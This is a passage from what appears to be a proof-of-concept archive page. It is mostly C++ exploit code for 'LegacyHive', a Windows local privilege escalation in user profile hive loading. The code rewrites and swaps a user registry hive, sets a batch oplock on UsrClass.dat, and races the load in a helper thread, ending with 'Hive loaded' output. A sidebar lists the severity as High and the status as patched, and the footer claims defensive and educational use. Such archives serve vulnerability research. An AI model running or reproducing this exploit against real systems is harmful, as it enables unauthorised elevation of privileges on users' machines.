+</span></span><span class=line><span class=cl>		<span class=n>ORCloseKey</span><span class=p>(</span><span class=n>htargetkey</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>htargetkey</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=n>retval</span> <span class=o>=</span> <span class=n>ORSaveHive</span><span class=p>(</span><span class=n>hivemap</span><span class=p>,</span> <span class=n>newhivepath</span><span class=p>,</span> <span class=n>osver</span><span class=p>.</span><span class=n>dwMajorVersion</span><span class=p>,</span> <span class=n>osver</span><span class=p>.</span><span class=n>dwMinorVersion</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>retval</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to save new hive content, error : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>retval</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=n>ORCloseHive</span><span class=p>(</span><span class=n>hivemap</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>hivemap</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>huserhive</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>huserhive</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>MoveFileEx</span><span class=p>(</span><span class=n>newhivepath</span><span class=p>,</span> <span class=n>userhivepath</span><span class=p>,</span> <span class=n>MOVEFILE_REPLACE_EXISTING</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to apply hive changes, error : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=n>shouldrestore</span> <span class=o>=</span> <span class=nb>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>CopyFile</span><span class=p>(</span><span class=n>usrclasshivepath</span><span class=p>,</span> <span class=n>usrclasshivepathnew</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to copy UsrClass.dat, error : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		
+</span></span><span class=line><span class=cl>		<span class=n>hlock</span> <span class=o>=</span> <span class=n>CreateFile</span><span class=p>(</span><span class=n>usrclasshivepathnew</span><span class=p>,</span> <span class=n>GENERIC_READ</span> <span class=o>|</span> <span class=n>GENERIC_WRITE</span> <span class=o>|</span> <span class=n>DELETE</span><span class=p>,</span> <span class=n>FILE_SHARE_READ</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>OPEN_EXISTING</span><span class=p>,</span> <span class=n>FILE_FLAG_OVERLAPPED</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>hlock</span> <span class=o>||</span> <span class=n>hlock</span> <span class=o>==</span> <span class=n>INVALID_HANDLE_VALUE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to open %ws, error : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>usrclasshivepathnew</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=n>ov</span><span class=p>.</span><span class=n>hEvent</span> <span class=o>=</span> <span class=n>CreateEvent</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>DeviceIoControl</span><span class=p>(</span><span class=n>hlock</span><span class=p>,</span> <span class=n>FSCTL_REQUEST_BATCH_OPLOCK</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ov</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>GetLastError</span><span class=p>()</span> <span class=o>!=</span> <span class=n>ERROR_IO_PENDING</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to request a batch oplock on the update file, error : %d&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=n>hthread</span> <span class=o>=</span> <span class=n>CreateThread</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=p>(</span><span class=n>LPTHREAD_START_ROUTINE</span><span class=p>)</span><span class=n>HiveLoaderThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>targ</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>tid</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>hthread</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to create helper thread, error : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=n>GetOverlappedResult</span><span class=p>(</span><span class=n>hlock</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ov</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>transfersz</span><span class=p>,</span> <span class=n>TRUE</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>hwindirlnk</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>hwindirlnk</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;oplock triggered !</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>hlock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>hlock</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		
+</span></span><span class=line><span class=cl>		<span class=n>WaitForSingleObject</span><span class=p>(</span><span class=n>hthread</span><span class=p>,</span> <span class=n>INFINITE</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=n>retval</span> <span class=o>=</span> <span class=n>RegOpenUserClassesRoot</span><span class=p>(</span><span class=n>htoken</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>MAXIMUM_ALLOWED</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>hloadedhive</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>hloadedhive</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>RegCloseKey</span><span class=p>(</span><span class=n>hloadedhive</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=n>hloadedhive</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>retval</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Exploit failed, hive was not loaded.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Hive loaded, press any key to unload and exit.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>catch</span> <span class=p>(</span><span class=n>DWORD</span> <span class=n>exception</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nl>cleanup</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>	<span class=n>_getch</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>hloadedhive</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>hloadedhive</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>hloadedhive</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>hthread</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>TerminateThread</span><span class=p>(</span><span class=n>hthread</span><span class=p>,</span> <span class=n>ERROR_SUCCESS</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>hthread</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>hthread</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>targ</span><span class=p>.</span><span class=n>hcallerthread</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>targ</span><span class=p>.</span><span class=n>hcallerthread</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>targ</span><span class=p>.</span><span class=n>hcallerthread</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>targ</span><span class=p>.</span><span class=n>hprocess</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>TerminateProcess</span><span class=p>(</span><span class=n>targ</span><span class=p>.</span><span class=n>hprocess</span><span class=p>,</span> <span class=n>ERROR_SUCCESS</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>targ</span><span class=p>.</span><span class=n>hprocess</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>targ</span><span class=p>.</span><span class=n>hprocess</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=n>Sleep</span><span class=p>(</span><span class=mi>500</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>ov</span><span class=p>.</span><span class=n>hEvent</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>ov</span><span class=p>.</span><span class=n>hEvent</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>ov</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>hwindirlnk</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>hwindirlnk</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>hwindirlnk</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>hwindirlnk1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>hwindirlnk1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>hwindirlnk1</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>hmsdirobj</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>hmsdirobj</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>hmsdirobj</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>hworkdirobj</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>hworkdirobj</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>hworkdirobj</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>huserhive</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>huserhive</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>huserhive</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>hivemap</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>ORCloseHive</span><span class=p>(</span><span class=n>hivemap</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>hivemap</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>shouldrestore</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>huserhive</span> <span class=o>=</span> <span class=n>CreateFile</span><span class=p>(</span><span class=n>userhivepath</span><span class=p>,</span> <span class=n>GENERIC_WRITE</span><span class=p>,</span> <span class=n>FILE_SHARE_READ</span> <span class=o>|</span> <span class=n>FILE_SHARE_WRITE</span> <span class=o>|</span> <span class=n>FILE_SHARE_DELETE</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>OPEN_EXISTING</span><span class=p>,</span> <span class=n>FILE_ATTRIBUTE_NORMAL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>huserhive</span> <span class=o>||</span> <span class=n>huserhive</span> <span class=o>==</span> <span class=n>INVALID_HANDLE_VALUE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{}</span>
+</span></span><span class=line><span class=cl>		<span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>WriteFile</span><span class=p>(</span><span class=n>huserhive</span><span class=p>,</span> <span class=n>hivebuff</span><span class=p>,</span> <span class=n>hivesz</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>readbytes</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=n>CloseHandle</span><span class=p>(</span><span class=n>huserhive</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=n>huserhive</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=n>RevertToSelf</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>GetFileAttributes</span><span class=p>(</span><span class=n>usrclasshivepathnew</span><span class=p>)</span> <span class=o>!=</span> <span class=n>INVALID_FILE_ATTRIBUTES</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>DeleteFile</span><span class=p>(</span><span class=n>usrclasshivepathnew</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>GetFileAttributes</span><span class=p>(</span><span class=n>newhivepath</span><span class=p>)</span> <span class=o>!=</span> <span class=n>INVALID_FILE_ATTRIBUTES</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>DeleteFile</span><span class=p>(</span><span class=n>newhivepath</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>htoken</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>CloseHandle</span><span class=p>(</span><span class=n>htoken</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>htoken</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>cleandir</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=n>RemoveDirectory</span><span class=p>(</span><span class=n>workdir</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div></div></div><nav class="mt-12 grid grid-cols-1 gap-3 border-t border-zinc-200 pt-6 sm:grid-cols-2 dark:border-zinc-800"><a href=/pocs/web/2026-07-19_cve-2026-58116-llamafactory-trust-remote-code-rce/ class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-zinc-800"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">← previous in binary</span>
+<span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">LLaMA-Factory WebUI Remote Code Execution via Hardcoded `trust_remote_code` (CVE-2026-58116)</span>
+</a><a href=/pocs/web/2026-07-19_cve-2026-55255-langflow-responses-api-idor/ class="group rounded-lg border border-zinc-200 p-3 text-right transition hover:border-emerald-400 dark:border-zinc-800"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">next in binary →</span>
+<span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">Langflow Responses API IDOR — Execute Another User's Flow (CVE-2026-55255)</span></a></nav></div><aside class="hidden lg:order-2 lg:block"><div class="sticky top-20"><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-zinc-800 dark:bg-zinc-900/40"><dl class="space-y-3 font-mono text-xs"><div><dt class="text-zinc-500 dark:text-zinc-400">Severity</dt><dd class=mt-1><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-orange-500/40 bg-orange-500/10 text-orange-500 dark:text-orange-400"><span class="h-1.5 w-1.5 rounded-full bg-current"></span>High</span></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Category</dt><dd class=mt-1><a href=/pocs/binary/ class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">binary</a></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">Microsoft Windows user profile service / registry hive loading path</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">Windows desktop and server installations reported as exploitable by the researcher as of July 2026 patches</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-07-19</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt><dd class=mt-1><span class="text-emerald-600 dark:text-emerald-400">patched</span></dd></div></dl><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p><div class="mt-2 flex flex-wrap gap-1.5"><a href=/tags/windows/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#windows</a>
+<a href=/tags/lpe/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#lpe</a>
+<a href=/tags/user-profile-service/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#user-profile-service</a>
+<a href=/tags/registry-hive/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#registry-hive</a>
+<a href=/tags/usrclass.dat/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#usrclass.dat</a>
+<a href=/tags/oplock/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#oplock</a>
+<a href=/tags/symbolic-link/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#symbolic-link</a></div></div><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p><ul class="mt-2 space-y-1.5"><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/MSNightmare/LegacyHive target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/MSNightmare/LegacyHive</a></li></ul></div><div class="border-t border-zinc-200 pt-4 dark:border-zinc-800"><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p><a href=https://github.com/intelseclab/poc-archive/tree/master/pocs/binary/2026-07-19_legacyhive-user-profile-service-hive-load-lpe/ target=_blank rel="noopener noreferrer" class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400"><svg class="h-3.5 w-3.5 flex-shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37.0.0 5.37.0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57.0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925.0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18.0.0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225.0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22.0 1.605-.015 2.895-.015 3.3.0.315.225.69.825.57A12.02 12.02.0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+intelseclab/poc-archive</a></div></div></div></aside></article></main><footer class="mt-16 border-t border-zinc-200 dark:border-zinc-800"><div class="mx-auto flex w-full max-w-6xl flex-col gap-2 px-4 py-8 text-xs text-zinc-500 sm:flex-row sm:items-center sm:justify-between sm:px-6 lg:px-8 dark:text-zinc-500"><p class=font-mono>PoC Archive — research artifacts for defensive and educational use only.</p><p class=font-mono>built with <a href=https://gohugo.io class="text-emerald-600 hover:underline dark:text-emerald-400">hugo</a> · deployed on github pages</p></div></footer></body></html>
